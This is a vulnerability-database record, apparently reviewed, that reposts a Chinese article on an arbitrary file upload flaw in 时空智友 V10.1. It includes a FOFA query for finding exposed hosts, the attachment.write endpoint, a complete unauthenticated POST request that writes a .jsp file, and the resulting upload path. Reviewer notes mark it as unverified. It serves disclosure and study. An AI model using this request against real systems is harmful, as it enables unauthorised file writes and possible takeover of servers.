---
source: "MrWQ/vulnerability-paper"
title: "时空智友 attachment.write文件上传"
product: "时空智友"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "V10.1声明"
prerequisites: "请求无Cookie未知"
side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
review_date: "2026-10-02"
source_url: "https://mp.weixin.qq.com/s/5MqOwaIupa0sRjju92UD0A"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E6%97%B6%E7%A9%BA%E6%99%BA%E5%8F%8B/%E6%97%B6%E7%A9%BA%E6%99%BA%E5%8F%8B%E4%BC%81%E4%B8%9A%E6%B5%81%E7%A8%8B%E5%8C%96%E7%AE%A1%E6%8E%A7%E7%B3%BB%E7%BB%9F%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%20%E9%99%84%20POC.md"
id: "vw-1b4dbe8c89b51aa302062e8b"
entity_id: "ve-1b4dbe8c89b51aa302062e8b"
schema_version: "1"
previous_fofa_unverified: "查询语句"
fofa: "app=\"时空智友 V10.1\""
---

# 时空智友 attachment.write文件上传

> 指纹字段校订（2026-10-04）：按原归档正文的明确平台标签及完整表达式恢复当前查询，旧误填或截取字段逐字保存在 `previous_*`；后文对此旧字段的诊断按当前字段阅读。仅经过本库保守语法与原字面核对，未在线运行查询，不把指纹命中视为漏洞存在。

## 条目说明

- 对象与具体问题：时空智友；attachment.write文件上传
- 版本、配置及部署条件：V10.1声明
- 认证与权限前提：请求无Cookie未知
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 纯数字写jsp仅证文件落地可读，称shell地址不准确
- 有响应文件名拼接说明可补64，但版本尚无build
- FOFA字段仅查询语句，标题重复/空编号/广告下载门槛需清理
- 官方域有来源但未具体修复

## 操作风险

文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/5MqOwaIupa0sRjju92UD0A)

时空智友企业流程化管控系统文件存在任意文件上传漏洞 附 POC
===============================

免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。

1. 时空智友企业流程化管控系统文件简介
--------------------

微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发

时空智友企业流程化管控系统是一个用于企业流程管理和控制的软件系统。

2. 漏洞描述
-------

时空智友企业流程化管控系统是一个用于企业流程管理和控制的软件系统。它旨在帮助企业实现流程的规范化、自动化和优化，从而提高工作效率、降低成本并提升管理水平。时空智友企业流程化管控系统存在任意文件上传漏洞

CVE 编号:

CNNVD 编号:

CNVD 编号:

3. 影响版本
-------

时空智友 V10.1 

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YBymZRfqwDoGbWYZ5Nw2yXNb9X0QPte86VpIXlic6J0DBERbmgXbec9fHibsojia0WTMxlq33xfCeJA/640?wx_fmt=jpeg)

4.fofa 查询语句
-----------

app="时空智友 V10.1"

5. 漏洞复现
-------

漏洞链接：http://127.0.0.1/formservice?service=attachment.write&isattach=false&filename=a.jsp

漏洞数据包：

```http
POST http://127.0.0.1/formservice?service=attachment.write&isattach=false&filename=a.jsp HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Length: 9

192513411


```

> 请求长度说明：原资料 Content-Length 为 9；保留原始标头；其数值未据实际请求体重新计算或验证。

上传成功后，会返回文件名。 

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YBymZRfqwDoGbWYZ5Nw2yXedOLDZNgicDMWdbfdytmF5NlTE8ZCvJkv5eiafAJPs52tOibeBNwfaT1w/640?wx_fmt=jpeg)

shell 地址：http://127.0.0.1/form/temp/202309212fq81zoqchav2jlq_a.jsp

这里最后的文件名拼接上面返回的文件地址 

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YBymZRfqwDoGbWYZ5Nw2yXKEoYia63rRsTWtwIEX9vQcpByoTQ2XYn36LuWXLqhIsOINapxOmibKYw/640?wx_fmt=jpeg)

6.POC&EXP
---------

关注公众号  南风漏洞复现文库 并回复  漏洞复现 49  即可获得该 POC 工具下载地址： 

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YBymZRfqwDoGbWYZ5Nw2yXQictPiaM5t18eu8plVOKG2Y4eUjqsALibz1muuNHj9DziaM6hGOiaMB1wNA/640?wx_fmt=jpeg)

7. 整改意见
-------

请关注厂商更新  https://www.sxskzy.com/

8. 往期回顾
-------

[企望制造 ERP 存在远程命令执行漏洞 附 POC](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247484178&idx=1&sn=3ad5910a3122f1e23728f4dda3cfdf87&chksm=974b8e15a03c0703bfe052df735ae74cc5a7f36eb6b7b317ff466e909704e8825a9770966de7&scene=21#wechat_redirect)  

[网御 ACM 上网行为管理系统 bottomframe.cgi 接口存在 SQL 注入漏洞 附 POC](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247484172&idx=1&sn=4b04a14edddf0d8d4b94f5a4f42ab9ee&chksm=974b8e0ba03c071d029bf2550d1d38090bce482f423fcca53dd2c601fd10b85a71f60e10c7e7&scene=21#wechat_redirect)

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
